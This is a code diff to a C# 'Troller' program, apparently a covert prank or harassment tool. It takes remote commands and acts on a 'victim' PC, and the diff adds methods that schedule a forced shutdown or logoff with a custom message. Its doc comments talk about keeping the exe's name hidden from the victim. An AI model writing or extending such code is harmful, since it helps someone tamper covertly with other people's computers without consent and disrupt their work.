@@ -121,12 +121,14 @@ namespace Troller
                 case "OPENURL": return OpenLinkOnBrowser(parameter);
                 case "WAITCUR": return ChangeCursorToWait(parameter);
                 case "CUSTCUR": return ChangeCursorToAnimation(parameter);
+                case "SHUTDWN": return ScheduleShutdown(parameter);
+                case "LOGUOFF": return ScheduleLogOff(parameter);
                 default: return true;
             }
         }
 
         #region Trolling actions
-
+        
         /// <summary>
         /// Shows a dialog message. Keep in mind that showing a message will let the victim know the name of your exe.
         /// </summary>
@@ -149,7 +151,7 @@ namespace Troller
         private static bool OpenLinkOnBrowser(string url)
         {
             DebugConsole.WriteLine("Opening tab.");
-
+            
             try
             {
                 Process.Start(url);
@@ -260,9 +262,25 @@ namespace Troller
 
         private static bool ScheduleShutdown(string shutdownMessage)
         {
-            int timeToShutdown = 0; //minutes
-            //run command line
-            //shutdown -s -t 1925000 -c “System error: overloaded porn folder”
+            int MAX_CHARS = 127;    //FROM: http://ss64.com/nt/shutdown.html
+
+            int secondsToShutdown = 60 * 15;
+            if (shutdownMessage.Length > MAX_CHARS)
+                shutdownMessage = shutdownMessage.Substring(0, MAX_CHARS - 1);
+
+            Process.Start("shutdown", string.Format("/s /t {0} /d p:0:0 /c \"{1}\"", secondsToShutdown, shutdownMessage));
+            return true;
+        }
+
+        private static bool ScheduleLogOff(string shutdownMessage)
+        {
+            int MAX_CHARS = 127;    //FROM: http://ss64.com/nt/shutdown.html
+            
+            int secondsToShutdown = 60 * 15;
+            if (shutdownMessage.Length > MAX_CHARS)
+                shutdownMessage = shutdownMessage.Substring(0, MAX_CHARS-1);
+
+            Process.Start("shutdown", string.Format("/l /t {0} /c \"{1}\"", secondsToShutdown, shutdownMessage));
             return true;
         }
 
@@ -364,7 +382,7 @@ namespace Troller
             const uint LR_LOADFROMFILE = 0x00000010;
             IntPtr ipImage = LoadImage(IntPtr.Zero, filename, IMAGE_CURSOR, 0, 0, LR_LOADFROMFILE);
             return new Cursor(ipImage);
-        }
+        }       
     }
 
     /// <summary>
